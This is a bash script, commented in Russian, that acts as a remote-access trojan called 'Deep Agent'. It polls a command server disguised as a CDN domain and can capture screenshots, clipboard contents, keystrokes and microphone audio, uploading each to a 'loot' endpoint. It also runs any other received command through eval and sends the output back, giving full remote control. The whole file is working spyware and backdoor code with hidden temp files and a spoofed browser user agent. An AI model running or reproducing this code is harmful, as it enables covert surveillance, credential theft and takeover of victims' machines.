#!/bin/bash
# Deep Agent — полный контроль над машиной
SERVER=${1:-"https://cdn.azureedge.net"}
ID=$(hostname | base64 -w0 | head -c8)

echo "[DEEP-AGENT] Full control agent started as $ID"

while true; do
    # Получаем команду
    CMD=$(curl -sk --max-time 10 -A "Mozilla/5.0 (Windows NT 10.0) Chrome/131.0.0.0" \
        "$SERVER/api/cmd/$ID" 2>/dev/null)
    
    case "$CMD" in
        screenshot)
            # Скриншот (Android/Linux)
            screencap -p /tmp/.shadow_scr.png 2>/dev/null
            import -window root /tmp/.shadow_scr.png 2>/dev/null
            [ -f /tmp/.shadow_scr.png ] && curl -sk --max-time 10 -X POST -F "file=@/tmp/.shadow_scr.png" "$SERVER/api/loot/$ID" 2>/dev/null
            rm -f /tmp/.shadow_scr.png
            ;;
            
        clipboard)
            # Буфер обмена
            termux-clipboard-get 2>/dev/null > /tmp/.shadow_clip.txt
            xclip -o 2>/dev/null > /tmp/.shadow_clip.txt
            [ -f /tmp/.shadow_clip.txt ] && curl -sk --max-time 10 -X POST --data-binary @/tmp/.shadow_clip.txt "$SERVER/api/loot/$ID" 2>/dev/null
            rm -f /tmp/.shadow_clip.txt
            ;;
            
        keylog)
            # Кейлоггер (запись нажатий)
            cat /dev/input/event* 2>/dev/null | strings > /tmp/.shadow_keys.txt &
            KEYLOG_PID=$!
            sleep 30
            kill $KEYLOG_PID 2>/dev/null
            [ -f /tmp/.shadow_keys.txt ] && curl -sk --max-time 10 -X POST --data-binary @/tmp/.shadow_keys.txt "$SERVER/api/loot/$ID" 2>/dev/null
            rm -f /tmp/.shadow_keys.txt
            ;;
            
        audio)
            # Запись с микрофона
            termux-microphone-record -f /tmp/.shadow_audio.mp3 -l 10 2>/dev/null
            arecord -d 10 -f cd /tmp/.shadow_audio.wav 2>/dev/null
            sleep 10
            for f in /tmp/.shadow_audio.*; do
                [ -f "$f" ] && curl -sk --max-time 15 -X POST -F "file=@$f" "$SERVER/api/loot/$ID" 2>/dev/null
                rm -f "$f"
            done
            ;;
            
        *)
            # Обычная команда
            RESULT=$(eval "$CMD" 2>&1 | head -c 1000 | base64 -w0)
            curl -sk --max-time 10 -X POST -d "$RESULT" "$SERVER/api/log/$ID" 2>/dev/null
            ;;
    esac
    
    sleep 30
done
